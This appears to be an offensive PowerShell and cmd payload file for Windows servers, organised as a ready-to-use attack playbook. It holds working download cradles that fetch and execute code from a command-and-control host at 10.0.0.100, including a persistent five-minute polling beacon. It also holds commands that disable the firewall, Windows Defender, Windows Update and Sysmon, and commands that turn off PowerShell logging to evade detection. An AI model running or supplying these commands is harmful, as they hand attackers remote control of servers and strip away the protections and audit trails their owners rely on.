# ============================================================
# SERVER PRIMARY PAYLOAD - Tier 2 (Windows Servers)
# ============================================================
# C2 beacon + firewall manipulation + service disruption
# Target: Windows Servers (sustained access)
# ============================================================

# FIREWALL: Disable firewall via netsh (best OPSEC - cmd.exe, outside PowerShell AMSI)
cmd /c "netsh advfirewall set allprofiles state off"

# FIREWALL: Disable firewall + prevent restart
cmd /c "netsh advfirewall set allprofiles state off & sc config mpssvc start= disabled"

# C2 BEACON: PowerShell download cradle (obfuscated)
$w=New-Object Net.WebClient;$s=$w.DownloadString('http://10.0.0.100:8080/agent.ps1');[scriptblock]::Create($s).Invoke()

# C2 BEACON: Polling beacon (checks for tasking every 5 min, built for persistence)
while($true){try{$t=(New-Object Net.WebClient).DownloadString('http://10.0.0.100:8080/tasks');if($t){IEX $t}}catch{};Start-Sleep -Seconds 300}

# SERVICE MANIPULATION: Stop and disable Windows Defender service
cmd /c "sc stop WinDefend & sc config WinDefend start= disabled"

# SERVICE MANIPULATION: Disable Defender real-time monitoring via policy registry
$p='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'; if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}; Set-ItemProperty -Path $p -Name DisableAntiSpyware -Value 1 -Type DWord -Force; $rp="$p\Real-Time Protection"; if(!(Test-Path $rp)){New-Item -Path $rp -Force|Out-Null}; Set-ItemProperty -Path $rp -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force

# SERVICE MANIPULATION: Stop and disable Windows Update
cmd /c "sc stop wuauserv & sc config wuauserv start= disabled & sc stop UsoSvc & sc config UsoSvc start= disabled"

# SERVICE MANIPULATION: Disable Sysmon
cmd /c "sc stop Sysmon64 2>nul & sc config Sysmon64 start= disabled 2>nul & sc stop Sysmon 2>nul & sc config Sysmon start= disabled 2>nul"

# DEFENSE EVASION: Disable Script Block Logging + Module Logging
$sb='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'; $ml='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging'; @($sb,$ml) | ForEach-Object { if(!(Test-Path $_)){New-Item -Path $_ -Force|Out-Null} }; Set-ItemProperty $sb -Name EnableScriptBlockLogging -Value 0 -Type DWord -Force; Set-ItemProperty $ml -Name EnableModuleLogging -Value 0 -Type DWord -Force
